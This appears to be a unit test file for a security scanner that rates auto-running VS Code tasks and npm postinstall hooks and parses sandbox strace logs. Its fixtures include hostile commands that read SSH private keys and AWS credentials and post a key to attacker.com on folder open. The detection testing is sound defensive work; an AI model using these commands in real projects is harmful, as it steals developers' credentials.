from __future__ import annotations

import json
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from guardit.config import load_config
from guardit.models import CandidateFile, ExecutionFlow
from guardit.sandbox.docker_runner import DockerSandboxRunner
from guardit.sandbox.strace_parser import parse_strace
from guardit.scanner import scan_source


class SandboxPolicyTest(unittest.TestCase):
    def test_auto_run_only_warns(self) -> None:
        report = _scan_fixture(
            {
                ".vscode/tasks.json": json.dumps(
                    {
                        "version": "2.0.0",
                        "tasks": [
                            {
                                "label": "hello",
                                "type": "shell",
                                "command": "echo hello",
                                "runOptions": {"runOn": "folderOpen"},
                            }
                        ],
                    }
                )
            },
            sandbox_mode="off",
        )
        self.assertEqual(report.score.risk_level, "WATCH")
        self.assertTrue(report.warnings)

    def test_auto_run_benign_build_script_warns_not_malicious(self) -> None:
        report = _scan_fixture(
            {
                "package.json": json.dumps({"scripts": {"postinstall": "node scripts/build.js"}}),
                "scripts/build.js": "console.log('build complete')",
            },
            sandbox_mode="off",
        )
        self.assertEqual(report.score.risk_level, "WATCH")
        self.assertTrue(report.warnings)

    def test_auto_run_with_credential_access_is_suspicious(self) -> None:
        report = _scan_fixture(
            {
                "package.json": json.dumps({"scripts": {"postinstall": "sh scripts/read.sh"}}),
                "scripts/read.sh": "cat $HOME/.ssh/id_rsa >/tmp/key-copy",
            },
            sandbox_mode="off",
        )
        self.assertEqual(report.score.risk_level, "SUSPICIOUS")

    def test_auto_run_with_external_post_is_suspicious(self) -> None:
        report = _scan_fixture(
            {
                ".vscode/tasks.json": json.dumps(
                    {
                        "tasks": [
                            {
                                "command": "curl -X POST https://example.com/telemetry",
                                "runOptions": {"runOn": "folderOpen"},
                            }
                        ]
                    }
                )
            },
            sandbox_mode="off",
        )
        self.assertEqual(report.score.risk_level, "SUSPICIOUS")

    def test_auto_run_credential_and_external_post_is_malicious(self) -> None:
        report = _scan_fixture(
            {
                ".vscode/tasks.json": json.dumps(
                    {
                        "tasks": [
                            {
                                "command": "curl -X POST -d $(cat ~/.ssh/id_rsa) http://attacker.com/steal",
                                "runOptions": {"runOn": "folderOpen"},
                            }
                        ]
                    }
                )
            },
            sandbox_mode="off",
        )
        self.assertEqual(report.score.risk_level, "MALICIOUS")
        self.assertTrue(report.score.forced_malicious)

    def test_docker_unavailable_falls_back_to_static(self) -> None:
        with patch("guardit.sandbox.docker_runner.shutil.which", return_value=None):
            report = scan_source("demo_repos/malicious", _config(sandbox_mode="docker"))
        self.assertTrue(report.sandbox_summary.fallback_used)
        self.assertFalse(report.sandbox_summary.is_real_sandbox)
        self.assertEqual(report.sandbox_summary.mode, "static-behavior-inference")

    def test_docker_sandbox_success_parses_observed_logs(self) -> None:
        candidate = CandidateFile("scripts/collect.sh", "cat $HOME/.aws/credentials\n", 27)
        flow = ExecutionFlow("package.json", "scripts/collect.sh", process_steps=["sh scripts/collect.sh"])

        def fake_run(command, **kwargs):
            trace_mount = next(item for item in command if item.endswith(":/trace:rw"))
            trace_dir = Path(trace_mount.rsplit(":/trace:rw", 1)[0])
            trace_dir.mkdir(parents=True, exist_ok=True)
            (trace_dir / "strace.log").write_text(
                'execve("/bin/sh", ["sh", "scripts/collect.sh"], 0x0) = 0\n'
                'openat(AT_FDCWD, "/sandbox-home/.aws/credentials", O_RDONLY) = 3\n',
                encoding="utf-8",
            )
            return subprocess.CompletedProcess(command, 0, "", "")

        with patch("guardit.sandbox.docker_runner.shutil.which", return_value="/usr/bin/docker"), patch(
            "guardit.sandbox.docker_runner.subprocess.run", side_effect=fake_run
        ):
            logs, summary = DockerSandboxRunner().analyze([candidate], [], [flow])
        self.assertTrue(summary.is_real_sandbox)
        self.assertFalse(summary.fallback_used)
        self.assertTrue(summary.observed_opened_files)
        self.assertTrue(any(log.origin == "observed" for log in logs))

    def test_strace_parser(self) -> None:
        logs = parse_strace(
            'execve("/usr/bin/python", ["python", "x.py"], 0x0) = 0\n'
            'openat(AT_FDCWD, "/sandbox-home/.ssh/id_rsa", O_RDONLY) = 3\n'
            "connect(3, {sa_family=AF_INET, sin_port=htons(443)}, 16) = -1 ENETUNREACH\n"
        )
        self.assertTrue(any(log.action == "process_spawn" for log in logs))
        self.assertTrue(any(log.action == "dummy_credential_access" for log in logs))
        self.assertTrue(any(log.action == "network_connect_attempt" for log in logs))


def _scan_fixture(files: dict[str, str], sandbox_mode: str) -> object:
    with tempfile.TemporaryDirectory(prefix="guardit_test_repo_") as tmp:
        root = Path(tmp)
        for rel, content in files.items():
            path = root / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(content, encoding="utf-8")
        return scan_source(str(root), _config(sandbox_mode=sandbox_mode))


def _config(sandbox_mode: str):
    config = load_config()
    return config.__class__(llm_provider="off", sandbox_mode=sandbox_mode)


if __name__ == "__main__":
    unittest.main()
